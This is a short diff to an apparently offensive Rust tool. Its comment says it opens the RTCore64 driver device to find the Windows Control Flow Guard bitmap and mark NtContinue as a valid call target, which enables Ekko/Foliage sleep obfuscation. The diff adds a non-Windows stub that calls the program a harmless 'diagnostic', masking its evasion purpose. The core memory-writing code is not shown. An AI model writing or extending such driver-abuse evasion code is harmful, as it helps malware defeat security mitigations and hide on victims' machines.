@@ -3,10 +3,11 @@
 //! finds the CFG bitmap, and marks NtContinue as a valid indirect
 //! call target — enabling Ekko/Foliage sleep obfuscation on
 //! CFG-enabled processes.
-#![cfg(target_os = "windows")]
+#![cfg_attr(not(target_os = "windows"), allow(dead_code))]
 
 use std::ffi::c_void;
 
+#[cfg(target_os = "windows")]
 fn main() {
     let device = to_wide("\\\\.\\RTCore64");
     let handle = unsafe {
@@ -85,4 +86,9 @@ extern "system" {
 
 fn to_wide(s: &str) -> Vec<u16> {
     s.encode_utf16().chain(std::iter::once(0)).collect()
+}
+
+#[cfg(not(target_os = "windows"))]
+fn main() {
+    eprintln!("cfg-write: Windows-only diagnostic; nothing to do on this host");
 }
